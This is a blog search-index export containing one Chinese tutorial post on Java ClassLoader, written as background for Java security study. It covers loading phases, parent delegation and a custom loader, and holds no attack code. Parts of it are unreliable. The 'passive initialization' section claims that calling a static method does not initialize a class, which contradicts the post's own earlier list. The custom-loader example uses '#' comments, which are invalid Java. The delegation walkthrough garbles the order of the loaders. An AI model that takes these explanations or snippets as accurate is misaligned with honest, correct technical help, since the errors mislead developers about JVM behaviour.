<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ClassLoader(类加载)-[Javasec]</title>
      <link href="/2023/04/26/%5BJavaSec%5D-ClassLoader(%E7%B1%BB%E5%8A%A0%E8%BD%BD)/"/>
      <url>/2023/04/26/%5BJavaSec%5D-ClassLoader(%E7%B1%BB%E5%8A%A0%E8%BD%BD)/</url>
      
        <content type="html"><![CDATA[<h1 id="ClassLoader-类加载"><a href="#ClassLoader-类加载" class="headerlink" title="ClassLoader(类加载)"></a>ClassLoader(类加载)</h1><h2 id="0x00-基础知识"><a href="#0x00-基础知识" class="headerlink" title="0x00 基础知识"></a>0x00 基础知识</h2><blockquote><p>Java源代码(.java)通过Java编译器编译成Java字节码(.class)文件，并保存在磁盘或网络等位置上。Java类加载器的主要作用是将这些字节码文件加载到内存中，并将其转化为Java类对象，供JVM调用和执行。</p></blockquote><p>Java程序在计算机运行中有三个阶段：</p><ol><li>代码阶段/编译阶段</li><li>Class类阶段(加载阶段)</li><li>Runtime运行阶段</li></ol><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202303221421884.png" alt="1"></p><p>这里解释一些名词，方便后续深入了解某些概念</p><ul><li>方法区：一块用于存储类信息、常量、静态变量等数据的内存区域</li><li>stack：在Java虚拟机中，stack（栈）是一种线程私有的内存区域，用于存储线程的方法调用和局部变量</li><li>heap：在Java虚拟机中，heap（堆）是一块用于存放对象实例的内存区域</li></ul><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304102143794.png" alt="在这里插入图片描述"></p><hr><p>类加载的三个阶段：</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202303221026618.png" alt="image-20230322102552839"></p><p>类加载后内存布局情况如下：</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202303221048054.png" alt="image-20230322104857011"></p><p>一、加载（Loading）</p><p>JVM在该阶段将字节码从不同的数据源（<code>class文件、jar包、网络</code>）转化为二进制字节流加载到内存中，并生成一个代表该类的<code>java.lang.Class</code>对象</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202303221439186.png" alt="image-20230322143948155"></p><p>二、连接（Linking）</p><blockquote><p>该阶段负责把类的二进制数据合并到<code>jre</code>中去（Java运行时环境）</p></blockquote><p><strong>验证</strong>：确保Class文件的字节流中包含的信息符合当前虚拟机的要求，并且不会危害虚拟机自身的安全</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202303221448437.png" alt="2"></p><p>（补充一下：为了方便虚拟机识别一个文件是否是class类型的文件。规定每个class文件都必须以四个字节作为开始，这个数字就是魔数）</p><p><strong>准备</strong>：JVM会在该阶段对静态变量，分配内存并初始化。这些变量所使用的内存都将在方法区中进行分配</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202303221527953.png" alt="在这里插入图片描述"></p><p>各数据类型的默认初始值如下：</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202303221502295.png" alt="3"></p><p><strong>解析</strong>：虚拟机将常量池内的符号引用（常量名）替换为直接引用（地址）的过程</p><p>符号引用：</p><blockquote><p>指的是在代码中使用的名称，比如方法名、字段名等</p></blockquote><p>直接引用：</p><blockquote><p>指实际的内存地址</p></blockquote><p>这里需要注意一下加载和连接阶段都是由JVM来控制的</p><p>三、初始化（initialization）</p><p>在Java中，类被创建时需要初始化，初始化阶段是类生命周期的最后一个阶段，主要是为变量赋初值，执行静态代码块中的代码，初始化父类，执行实例变量的赋值操作以及执行构造方法来完成类的初始化操作</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202303221614930.png" alt="在这里插入图片描述"></p><p>类初始化又分为被动初始化和主动初始化两种情况：</p><ol><li><p>被动初始化：若只是使用类的成员变量，不涉及到调用类的构造方法或者静态方法时，JVM不会对类进行初始化，称之为被动初始化。</p></li><li><p>主动初始化：当进行如下任何一种操作时，JVM便会对类进行主动初始化</p><blockquote><p>创建类的实例；</p><p>访问类或者接口的静态变量，或者为静态变量赋值；</p><p>调用类或接口的静态方法；</p><p>反射某个类；</p><p>初始化某个子类；</p><p>启动类（包含 main 方法的类）。</p></blockquote></li></ol><p>需注意的是类初始化只会进行一次，类初始化的结果会存储在方法区（JDK8之前）或元空间（JDK8及之后）中，随后所有对象共享这些结果。</p><p>主动初始化：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InitExample</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">counter</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="comment">// 静态代码块，在类加载时执行，用于初始化静态变量</span></span><br><span class="line">        System.out.println(<span class="string">&quot;InitExample 静态代码块执行&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">InitExample</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 构造函数</span></span><br><span class="line">        System.out.println(<span class="string">&quot;InitExample 构造函数执行&quot;</span>);</span><br><span class="line">        counter++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">incrementCounter</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 静态方法，会使用类的静态变量</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Counter 值为 &quot;</span> + counter);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 创建一个实例，会触发类的初始化</span></span><br><span class="line">        <span class="type">InitExample</span> <span class="variable">initExample</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitExample</span>();</span><br><span class="line">        <span class="comment">// 调用静态方法，会触发类的初始化</span></span><br><span class="line">        incrementCounter();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>结果如下：</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202303221638813.png" alt="image-20230322163842767"></p><p>创建实例<code>initExample</code>时会触发类的初始化，因此静态代码块会被执行。当再调用<code>incrementCounter</code>时，需要访问类的静态成员变量 <code>counter</code>，由于 <code>counter</code> 已经准备好，具备了初始化条件，静态代码块就不会再次执行，而是直接使用准备好的 <code>counter</code> 变量值。这也表明了静态代码块只会在类初始化阶段执行一次</p><p>被动初始化：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="comment">// 调用静态方法，不会触发类的初始化</span></span><br><span class="line">    incrementCounter();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果如下：</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202303221655387.png" alt="image-20230322165536349"></p><p>静态方法<code>incrementCounter</code>会直接使用静态变量counter，不需要创建类的对象，因此不会触发类的初始化。</p><hr><h2 id="0x01-JVM三种类加载器"><a href="#0x01-JVM三种类加载器" class="headerlink" title="0x01 JVM三种类加载器"></a>0x01 JVM三种类加载器</h2><ol><li>启动类加载器（Bootstrap Classloader）也叫引导类加载器：它是最顶层的类加载器，负责加载Java的核心类库，如 <code>rt.jar</code> 等，由C++语言实现。   </li><li>扩展类加载器（Extension Classloader）：它负责加载扩展目录下（ <code>JAVA_HOME/jre/lib/ext</code> ）的jar包，在JVM启动时创建，由Java语言实现。</li><li>应用程序类加载器（Application Classloader）也叫系统类加载器：它负责加载应用程序类路径下的类，包括自己写的代码和第三方jar包等，是最常用的类加载器，也是默认的类加载器。</li></ol><p>除了上述java自带提供的类加载器外，还可以通过继承java.lang.ClassLoader类的方式实现自己的类加载器，即自定义类加载器（UserDefineClassLoader）</p><hr><p>举个例子来理解一下JVM三种类加载器之间的关系以及各自的作用：</p><p>假设编写一个Java程序，并且程序需要使用一个名为<code>com.example.MyClass</code>的自定义类。当程序启动时，JVM将首先使用<strong>启动类加载器</strong>查找所有位于JVM启动路径（bootstrap classpath）的类文件，其中可能包括JVM本身的类和库。 </p><p>若<strong>启动类加载器</strong>找不到<code>com.example.MyClass</code>，则它会将类请求传递给<strong>扩展类加载器</strong>。<strong>扩展类加载器</strong>负责查找位于JVM扩展路径（extension classpath）中的类。如果它找到了<code>com.example.MyClass</code>，它将把类加载到JVM中并返回给启动类加载器。   如果扩展类加载器仍然找不到<code>com.example.MyClass</code>，则应用程序类加载器会被调用。应用程序类加载器负责查找位于应用程序类路径（classpath）中的类，这些类是应用程序自己的类和库。如果应用程序类加载器找到了<code>com.example.MyClass</code>，它将类加载到JVM中并返回给扩展类加载器，最终返回给启动类加载器。   </p><p>这里其实就涉及到了双亲委派机制</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304202346112.png" alt="JVM - 双亲委派机制 | 在码圈-专注编程技术分享-代码改变未来，努力coding"></p><h2 id="0x02-双亲委派机制"><a href="#0x02-双亲委派机制" class="headerlink" title="0x02 双亲委派机制"></a>0x02 双亲委派机制</h2><p>通常情况下，JVM默认三种类加载器会相互配合使用，且是按需加载方式，加载过程使用的是双亲委派模式，即把需要加载的类交由父加载器进行处理。</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304202236076.jpeg" alt="JVM学习笔记之类装载器-ClassLoader-龙果博客-IT技术文章-龙果学院博客"></p><p>双亲委派机制：是JVM中的一种类加载器工作模式。通过父子关系，将类加载请求委派给父类加载器先尝试加载，如果父类加载器无法加载，则再由子类加载器进行加载。</p><p>具体来说，当一个类需要被加载时，双亲委派机制会首先将这个任务委派给它的父类加载器。若父类加载器无法完成这个加载任务，它会继续将任务向上委托给它的父类加载器，直到顶层的启动类加载器。若启动类加载器无法完成这个任务，它会将任务退回给子类加载器，再依次尝试查找。如果所有的类加载器都无法找到所需的类，系统会抛出 <code>ClassNotFoundException</code> 异常。   </p><p>双亲委派机制的作用：</p><ol><li>这种机制有效地避免了同名类的冲突，并防止了恶意代码的注入</li><li>Java程序可以确保每个类都只被加载一次，并且尽可能地保证类的唯一性和安全性。</li></ol><p>下面通过代码来理解一下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ClassLoaderTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 获取当前线程上下文加载器</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">contextClassLoader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">        System.out.println(<span class="string">&quot;当前线程上下文加载器：&quot;</span> + contextClassLoader);</span><br><span class="line">        <span class="comment">// 获取系统类加载器</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">systemClassLoader</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader();</span><br><span class="line">        System.out.println(<span class="string">&quot;系统类加载器：&quot;</span> + systemClassLoader);</span><br><span class="line">        <span class="comment">// 获取系统类加载器的父类加载器，即扩展类加载器</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">extClassLoader</span> <span class="operator">=</span> systemClassLoader.getParent();</span><br><span class="line">        System.out.println(<span class="string">&quot;扩展类加载器：&quot;</span> + extClassLoader);</span><br><span class="line">        <span class="comment">// 获取扩展类加载器的父类加载器，即启动类加载器</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">bootstrapClassLoader</span> <span class="operator">=</span> extClassLoader.getParent();</span><br><span class="line">        System.out.println(<span class="string">&quot;启动类加载器：&quot;</span> + bootstrapClassLoader);</span><br><span class="line">        <span class="comment">// 尝试使用当前类的类加载器加载System类</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class&lt;?&gt; systemClass = contextClassLoader.loadClass(<span class="string">&quot;java.lang.System&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;System类加载器：&quot;</span> + systemClass.getClassLoader());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304202324584.png" alt="image-20230420232411539"></p><p>通过输出结果，可以看到类加载器之间的父子关系，以及双亲委派机制的工作过程。</p><p>应用程序类加载器首先尝试加载 <code>java.lang.System</code> 类，但发现自己无法加载这个类。于是，它将加载任务委派给它的父类加载器，即系统类加载器，系统类加载器又将任务委派给扩展类加载器，扩展类加载器最终将任务委派给启动类加载器。由于启动类加载器能够找到 <code>java.lang.System</code> 类，所以它加载了这个类，系统类加载器、扩展类加载器和应用程序类加载器不需要参与类加载过程。最终， <code>java.lang.System</code> 类被应用程序类加载器加载成功，并打印出了它的类加载器。</p><p>这里解释一下启动类加载器结果为null：</p><p>（因为启动类加载器是由Java虚拟机的实现所提供的，并不是一个普通的Java类，也不是由Java代码实现的，所以没有相应的Java类对象。启动类加载器的实现是由C++编写的，它是JVM的一部分，并不受Java代码控制。因此，当在Java代码中使用getClass().getClassLoader()方法获取一个类的类加载器时，如果这个类是由启动类加载器加载的，那么返回值就会是null。）</p><h2 id="0x03-CLassLoader类核心方法"><a href="#0x03-CLassLoader类核心方法" class="headerlink" title="0x03 CLassLoader类核心方法"></a>0x03 CLassLoader类核心方法</h2><p><code>findClass(String name)</code> - 根据指定名称查找类文件并返回相应的Class对象   </p><ul><li>该方法首先会检查当前ClassLoader是否能够加载该类，如果不能加载则会沿着ClassLoader的层次结构向上查找，直到找到一个能够加载该类的ClassLoader，然后返回该ClassLoader所加载的类。 </li></ul><p><code>loadClass(String name)</code> - 加载指定名称的类   </p><ul><li>该方法是主要的类加载方法，尝试加载并链接指定名称的类。它会先检查当前ClassLoader是否能够加载该类，如果不能加载则会沿着ClassLoader的层次结构向上查找，直到找到一个能够加载该类的ClassLoader，然后返回该ClassLoader所加载的类。如果所有的ClassLoader都没有找到该类，则会抛出ClassNotFoundException异常。 </li></ul><p><code>getResource(String name)</code> - 在类路径下查找指定名称的资源文件并返回URL对象   </p><ul><li>该方法首先会检查当前ClassLoader的类路径下是否包含指定名称的资源文件，如果找到了则返回相应的URL对象</li></ul><p><code>getResourceAsStream(String name)</code> - 在类路径下查找指定名称的资源文件并返回InputStream对象  </p><ul><li>该方法首先会检查当前ClassLoader的类路径下是否包含指定名称的资源文件，如果找到了则返回相应的InputStream对象。 </li></ul><p><code>getParent()</code> - 返回该ClassLoader的父ClassLoader </p><ul><li>若当前ClassLoader没有父ClassLoader，则返回null</li></ul><p><code>defineClass(String name, byte[] b, int off, int len)</code> - 将字节数组转换成一个Class对象   </p><ul><li>该方法首先将字节数组转换成一个Java类文件的内存映像，然后再用该内存映像创建一个Class对象。该方法主要用于动态加载类，比如在Java程序运行时根据用户输入的数据或者其他条件获取类定义，并动态地将该类加载到Java虚拟机中来。</li></ul><h2 id="0x04-类加载隔离"><a href="#0x04-类加载隔离" class="headerlink" title="0x04 类加载隔离"></a>0x04 类加载隔离</h2><p>在JVM中存在多个类加载器，每个类加载器都负责从不同的资源（例如文件系统、网络、JAR文件等）中去加载类。在Java应用程序中，通常使用<strong>系统类加载器</strong>来加载类。</p><p>当在同一个JVM中运行多个Java应用程序时，如果它们使用了相同的类库，就会发生类库冲突。例如，如果两个应用程序都使用了不同版本的某个类库，则可能会发生不兼容性或冲突问题，导致应用程序崩溃。</p><p>而类加载隔离机制可以有效解决这个问题。类加载隔离机制在不同的应用程序之间提供了完全独立的类加载环境，每个应用程序都有自己的类加载器和类库，互相之间不会干扰。</p><p><strong>具体实现方法：</strong></p><p>为每个应用程序创建一个独立的类路径，并为该应用程序使用单独的类加载器。类加载器可以从不同的资源中加载类，每个应用程序的类库互相之间是独立的。这样，不同应用程序间的类库冲突问题可以得到避免。 </p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304221105332.png" alt="img"></p><p>通过一个例子来具体理解下：</p><p>应用程序使用了Apache工具包中的commons-lang3库。插件程序同样使用了commons-lang3库，但是是不同版本的库。</p><p>在此情况下，如果不使用类加载隔离机制，那么应用程序和插件程序就会产生类库冲突，导致应用程序崩溃。  为了避免这种冲突，可以使用类加载隔离机制。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AppClassLoader</span> <span class="keyword">extends</span> <span class="title class_">URLClassLoader</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">AppClassLoader</span><span class="params">(URL[] urls)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(urls);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PluginClassLoader</span> <span class="keyword">extends</span> <span class="title class_">URLClassLoader</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">PluginClassLoader</span><span class="params">(URL[] urls)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(urls);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Application</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 创建应用程序类加载器，并设置类路径</span></span><br><span class="line">        <span class="type">AppClassLoader</span> <span class="variable">appClassLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AppClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[]&#123;<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;file:/path/to/commons-lang3.jar&quot;</span>)&#125;);</span><br><span class="line">         <span class="comment">// 加载应用程序中的类</span></span><br><span class="line">        Class&lt;?&gt; appClass = appClassLoader.loadClass(<span class="string">&quot;com.example.Application&quot;</span>);</span><br><span class="line">         <span class="comment">// 创建插件程序类加载器，并设置类路径（另一个版本的commons-lang3库）</span></span><br><span class="line">        <span class="type">PluginClassLoader</span> <span class="variable">pluginClassLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PluginClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[]&#123;<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;file:/path/to/another/commons-lang3.jar&quot;</span>)&#125;);</span><br><span class="line">         <span class="comment">// 加载插件程序中的类</span></span><br><span class="line">        Class&lt;?&gt; pluginClass = pluginClassLoader.loadClass(<span class="string">&quot;com.example.Plugin&quot;</span>);</span><br><span class="line">         <span class="comment">// 调用应用程序和插件程序中的方法</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">appObj</span> <span class="operator">=</span> appClass.newInstance();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">pluginObj</span> <span class="operator">=</span> pluginClass.newInstance();</span><br><span class="line">        appClass.getMethod(<span class="string">&quot;callPluginMethod&quot;</span>, Object.class).invoke(appObj, pluginObj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Plugin</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello from plugin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Application</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">callPluginMethod</span><span class="params">(Object plugin)</span> &#123;</span><br><span class="line">        <span class="comment">// 调用插件程序的hello()方法</span></span><br><span class="line">        plugin.getClass().getMethod(<span class="string">&quot;hello&quot;</span>).invoke(plugin);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如代码所示，<code>AppClassLoader</code>和<code>PluginClassLoader</code>分别用来加载应用程序和插件程序中的类。两个类加载器分别使用了不同的commons-lang3库，保证了它们之间的类库互相独立，避免了类库冲突问题。</p><h2 id="0x05-自定义类加载器过程"><a href="#0x05-自定义类加载器过程" class="headerlink" title="0x05 自定义类加载器过程"></a>0x05 自定义类加载器过程</h2><p>为什么要了解自定义类加载的过程？</p><p>利用自定义ClassLoader类，可以将恶意代码注入到应用程序中，然后通过ClassLoader来加载并执行恶意代码。因此，理解自定义ClassLoader类的原理和实现方法对于Java安全实践非常重要</p><p>自定义类加载器步骤如下：</p><p>继承ClassLoader类</p><ul><li>自定义类加载器必须继承ClassLoader类，这样才能够使用JVM提供的类加载机制。</li></ul><p>覆盖findClass()方法</p><ul><li>findClass()方法负责从指定路径或文件中加载类文件。在实现findClass()方法时，通常需要重写其逻辑，来达到自定义需求。 </li></ul><p>实现defineClass()方法</p><ul><li>defineClass()方法实现类的定义功能。在自定义类加载器中，可以通过覆盖defineClass()方法来实现自己的类定义逻辑。  </li></ul><p>调用loadClass()方法</p><ul><li>自定义类加载器中，还需要调用loadClass()方法来实现类的加载。</li></ul><p>确定类加载路径</p><ul><li>自定义类加载器还需要确定类的加载路径。这个路径可以是文件系统路径、网络路径或者其他自定义的路径。  </li></ul><p>加载类文件</p><ul><li>自定义类加载器把类文件加载进内存中，这个过程可以通过读取类文件的字节流来实现。 </li></ul><p>下面通过一个例子来具体了解一下自定义类加载器过程：</p><p>先自定义一个MyClass类（这个类的字节码文件通常位于classpath或某个jar包里，接下来要通过自定义类加载器来加载这个类）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sayHello</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello World!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建一个自定义类加载器 <code>MyClassLoader</code>，它继承了Java标准库中的ClassLoader类。在这个自定义类加载器中，重写了 <code>findClass()</code> 方法，尝试将类的字节码从文件中读取出来，并通过 <code>defineClass()</code> 方法来定义这个类。而这个字节码则是通过 <code>getClassBytes()</code> 方法来获取的，它会将类的名字转换为路径形式并读取相应的文件。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">     <span class="keyword">public</span> <span class="title function_">MyClassLoader</span><span class="params">(ClassLoader parent)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(parent);</span><br><span class="line">    &#125;</span><br><span class="line">     <span class="meta">@Override</span></span><br><span class="line">  #重写findClass()方法，这个方法接收一个类的名称作为参数，并通过该名称加载字节码。</span><br><span class="line">    <span class="keyword">public</span> Class&lt;?&gt; findClass(String className) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">         #调用getClassBytes()方法来获取字节码</span><br><span class="line">            <span class="type">byte</span>[] classBytes = getClassBytes(className);</span><br><span class="line">         #调用defineClass()方法来加载字节码（字节码必须是以字节数组的形式传递给defineClass()方法）</span><br><span class="line">            <span class="keyword">return</span> defineClass(className, classBytes, <span class="number">0</span>, classBytes.length);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(<span class="string">&quot;Failed to load class &quot;</span> + className, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  #将类名转换为路径形式并读取相应的文件，将类名转换为路径形式后，结果是MyClass.<span class="keyword">class</span></span><br><span class="line">     <span class="title class_">private</span> <span class="type">byte</span>[] getClassBytes(String className) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">classPath</span> <span class="operator">=</span> className.replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>) + <span class="string">&quot;.class&quot;</span>;</span><br><span class="line">  #使用getResourceAsStream()方法来读取该文件并将它以字节数组的形式返回</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> getClass().getClassLoader().getResourceAsStream(classPath);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">buffer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">int</span> byteRead;</span><br><span class="line">        <span class="keyword">while</span> ((byteRead = is.read()) != -<span class="number">1</span>) &#123;</span><br><span class="line">            buffer.write(byteRead);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> buffer.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>最后使用自定义类加载器来加载 <code>MyClass</code> 类。首先创建一个自定义类加载器 <code>classLoader</code> ，然后调用 <code>loadClass()</code> 方法来加载 <code>MyClass</code> 类。再使用反射创建MyClass类实例，并调用它的sayHello()方法。</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304221238076.png" alt="image-20230422123828945"></p><h2 id="0x06-参考博客"><a href="#0x06-参考博客" class="headerlink" title="0x06 参考博客"></a>0x06 参考博客</h2><p>@[攻击Java Web应用-<a href="https://javasec.org/">Java Web安全] (javasec.org)</a></p><p>@<a href="https://www.bilibili.com/video/BV1g84y1F7df?p=11&vd_source=d6c70365c008bfb6f1d8bf1abee22a81">韩顺平</a></p><p>@<a href="https://javaguide.cn/home.html">JavaGuide（Java学习&amp;&amp;面试指南）</a></p><p>@<a href="https://xz.aliyun.com/t/9002#toc-10">https://xz.aliyun.com/t/9002#toc-10</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>由源码泄露到RCE-[Mssql]</title>
